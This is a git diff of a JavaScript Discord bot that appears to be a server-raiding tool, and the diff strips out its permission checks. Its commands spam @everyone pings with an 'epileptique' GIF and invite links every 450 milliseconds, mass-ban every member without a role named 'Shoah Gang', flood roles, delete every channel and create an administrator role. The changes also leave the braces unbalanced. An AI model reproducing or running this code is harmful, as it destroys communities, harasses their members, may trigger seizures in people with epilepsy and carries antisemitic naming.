@@ -3,7 +3,6 @@ const bot = new Discord.Client();
 const fs = require('fs');
 const moment = require("moment");
  var prefix = "."
-  var perms = ["ADMINISTRATOR", "MANAGE_CHANNELS"]
 bot.on('ready',() => {
   //invit link
   console.log("---------------------------")
@@ -27,7 +26,7 @@ bot.on('message', msg => {
   }
  if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
     
-  if (msg.content === '.destruction') {
+if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
       msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
@@ -35,11 +34,9 @@ bot.on('message', msg => {
       "https://discord.gg/8vtFryt \n"+
       "https://discord.gg/s5Y2RfG").catch(e => {});
     }, 450)
-  } 
+  }
 
 if (msg.content === '.oupss') {
-  if(guild.member(bot.user).hasPermission(perms)){
-
     console.log(`Commande .oupss par ${msg.author.tag}`);
    fucked = false;
 
@@ -60,17 +57,14 @@ if (msg.content === '.oupss') {
       msg.delete();
     }
   }
-}
 
 
 if (msg.content === '.banev') {
-  if(guild.member(bot.user).hasPermission("BAN_MEMBERS")){
     console.log(`Commande .banev par ${msg.author.tag}`);
     msg.guild.members.forEach(member => {
       if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
     });
   }
-}
 
 
 if (msg.content === '.leave') {
@@ -80,7 +74,6 @@ if (msg.content === '.leave') {
   }
 
 if (msg.content === '.pardon') {
-  if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){ 
     console.log(`Commande .pardon par ${msg.author.tag}`);
 
     msg.member.guild.createRole({
@@ -92,12 +85,7 @@ if (msg.content === '.pardon') {
       if (msg.deletable) msg.delete().catch(e => {});
     }).catch(e => {});
   }
-  }
-
-
   if (msg.content === '.roleflood') {
-    if(guild.member(bot.user).hasPermission("MANAGE_ROLES")){ 
-
     console.log(`Commande .roleflood par ${msg.author.tag}`);
     if (msg.deletable) msg.delete();
     let i = 0;
@@ -110,16 +98,13 @@ if (msg.content === '.pardon') {
        });
     
       }
-    }
 
   if(msg.content === ".del"){
-    if(guild.member(bot.user).hasPermission("MANAGE_CHANNELS")){ 
     if (msg.deletable) msg.delete().catch(e => {});
     msg.guild.channels.forEach(chan => {
       if (chan.deletable) chan.delete().catch(e => {});
     });
   }
-}
 
 
   if(msg.content === ".mp"){
